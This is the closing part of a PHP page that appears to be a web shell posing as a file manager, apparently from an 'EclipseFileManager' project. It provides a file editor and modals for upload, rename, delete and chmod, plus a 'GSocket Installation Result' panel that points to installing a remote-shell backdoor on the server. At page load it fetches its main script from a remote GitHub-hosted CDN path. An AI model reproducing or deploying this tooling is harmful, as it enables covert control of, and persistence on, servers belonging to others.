                    $editorMode = getEditorMode($filename);
                ?>
                <div class="card mt-4" style="margin-bottom: 0;" id="editorCard">
                    <div class="card-header">
                        <div>Editing: <?php echo htmlspecialchars($filename); ?></div>
                        <div>
                            <button class="btn btn-sm btn-light toggle-theme-btn">
                                <i class="fas fa-moon"></i>
                                <span>Toggle Theme</span>
                            </button>
                            <button class="btn btn-sm btn-light fullscreen-toggle">
                                <i class="fas fa-expand"></i>
                                <span>Fullscreen</span>
                            </button>
                        </div>
                    </div>
                    <div class="card-body p-0">
                        <div class="editor-container">
                            <form method="post">
                                <div class="editor-body">
                                    <textarea name="content" id="codeEditor" data-mode="<?php echo $editorMode; ?>"><?php echo $content; ?></textarea>
                                </div>
                                <div class="editor-footer">
                                    <div class="text-xs text-muted mt-2">
                                        Shortcuts: <kbd>Ctrl+S</kbd> Save, <kbd>Ctrl+F</kbd> Find, <kbd>Ctrl+Space</kbd> Autocomplete, <kbd>F11</kbd> Fullscreen
                                    </div>
                                    <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit)); ?>">
                                    <button type="submit" class="btn btn-primary">
                                        <i class="fas fa-save"></i>
                                        <span>Save Changes</span>
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
                <?php endif; endif; ?>
                <?php endif; ?>
            </div>
        </main>
    </div>
    <div class="modal-backdrop" id="uploadModal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title">Upload Files</div>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <form method="post" enctype="multipart/form-data" id="uploadForm">
                    <div class="dropzone" id="dropzone">
                        <div class="dropzone-icon">
                            <i class="fas fa-cloud-upload-alt"></i>
                        </div>
                        <div class="dropzone-text">Drag & drop files here or click to browse</div>
                        <div class="dropzone-hint">Maximum file size: 10MB</div>
                        <input type="file" name="upload[]" id="fileInput" style="display: none;" multiple>
                    </div>
                    <div id="selectedFiles" class="mt-4" style="display: none;">
                        <div class="file-list-preview">
                            <div class="file-list-preview-header">Selected Files</div>
                            <div class="file-list-preview-body" id="filePreviewList"></div>
                        </div>
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
                <button class="btn btn-primary" id="submitUpload">Upload</button>
            </div>
        </div>
    </div>
    <div class="modal-backdrop" id="newFolderModal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title">Create New Folder</div>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <form method="post" id="newFolderForm">
                    <div class="form-group">
                        <label for="folderName" class="form-label">Folder Name</label>
                        <input type="text" name="new_folder" id="folderName" class="form-control" placeholder="Enter folder name" required>
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
                <button class="btn btn-primary" id="submitNewFolder">Create</button>
            </div>
        </div>
    </div>
    <div class="modal-backdrop" id="newFileModal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title">Create New File</div>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <form method="post" id="newFileForm">
                    <div class="form-group">
                        <label for="fileName" class="form-label">File Name</label>
                        <input type="text" name="new_file" id="fileName" class="form-control" placeholder="Enter file name" required>
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
                <button class="btn btn-primary" id="submitNewFile">Create</button>
            </div>
        </div>
    </div>
    <div class="modal-backdrop" id="renameModal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title">Rename Item</div>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <form method="post" id="renameForm">
                    <div class="form-group">
                        <label for="newName" class="form-label">New Name</label>
                        <input type="hidden" name="rename_from" id="renameFrom">
                        <input type="text" name="rename_to" id="newName" class="form-control" placeholder="Enter new name" required>
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
                <button class="btn btn-primary" id="submitRename">Create</button>
            </div>
        </div>
    </div>
    <div class="modal-backdrop" id="deleteModal">
        <div class="modal">
            <div class="modal-header">
                <div class="modal-title">Confirm Delete</div>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <p>Are you sure you want to delete <strong id="deleteItemName"></strong>?</p>
                <p class="text-danger">This action cannot be undone.</p>
            </div>
            <div class="modal-footer">
                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
                <a href="#" class="btn btn-danger" id="confirmDelete">Delete</a>
            </div>
        </div>
    </div>
<div class="modal-backdrop" id="chmodModal">
    <div class="modal">
        <div class="modal-header">
            <div class="modal-title">Change Permissions</div>
            <button class="modal-close" data-dismiss="modal">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="modal-body">
            <form method="post" id="chmodForm">
                <p>Changing permissions for: <strong id="chmodItemName"></strong></p>
                <div class="form-group mb-4">
                    <label for="directPermValue" class="form-label">Permission Value (Octal):</label>
                    <input type="text" id="directPermValue" name="chmod_value" class="form-control" placeholder="e.g. 644, 755" maxlength="4">
                    <small class="text-muted">Input permission number directly (e.g. 755, 644)</small>
                </div>
                
                <input type="hidden" name="chmod_path" id="chmodPath">
            </form>
        </div>
        <div class="modal-footer">
            <button class="btn btn-light" data-dismiss="modal">Cancel</button>
            <button class="btn btn-primary" id="submitChmod">Apply</button>
        </div>
    </div>
</div>
    <?php if (isset($_GET['gsocket_installed']) && isset($_SESSION['gsocket_output'])): ?>
    <div class="modal-backdrop show" id="gsocketOutputModal">
        <div class="modal" style="max-width: 700px;">
            <div class="modal-header">
                <div class="modal-title">GSocket Installation Result</div>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div class="terminal-output">
<?php foreach ($_SESSION['gsocket_output'] as $line): ?>
<?php 
    $class = '';
    if (stripos($line, 'error') !== false) {
        $class = 'error';
    } elseif (stripos($line, 'warning') !== false) {
        $class = 'warning';
    } elseif (stripos($line, 'success') !== false || stripos($line, 'installed') !== false) {
        $class = 'success';
    } elseif (stripos($line, 'info') !== false) {
        $class = 'info';
    }
?>
<div class="<?php echo $class; ?>"><?php echo htmlspecialchars($line); ?></div>
<?php endforeach; ?>
                </div>
                
                <div class="mt-4">
                    <p>Installation Status: 
                        <?php if ($_SESSION['gsocket_status'] === 0): ?>
                        <span class="perm-writable">Success</span>
                        <?php else: ?>
                        <span class="perm-not-writable">Failed (Code: <?php echo $_SESSION['gsocket_status']; ?>)</span>
                        <?php endif; ?>
                    </p>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-primary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
    <?php 
        unset($_SESSION['gsocket_output']);
        unset($_SESSION['gsocket_status']);
    endif; 
    ?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/markdown/markdown.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/sql/sql.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/python/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/yaml/yaml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/edit/matchbrackets.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/edit/closebrackets.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/edit/closetag.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/foldcode.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/foldgutter.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/brace-fold.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/xml-fold.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/comment-fold.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/indent-fold.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/markdown-fold.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/display/autorefresh.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/search/search.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/search/searchcursor.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/search/jump-to-line.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/dialog/dialog.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/html-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/css-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/javascript-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/sql-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/selection/active-line.min.js"></script>
    <script>
        const PHP_CHAT_SESSION_ID = '<?php echo $_SESSION['chat_session_id']; ?>';
    </script>
<script src="https://cdn.jsdelivr.net/gh/eclibesec/EclipseFileManager@main/script.js"></script>
</body>
</html>
<?php endif; ?>
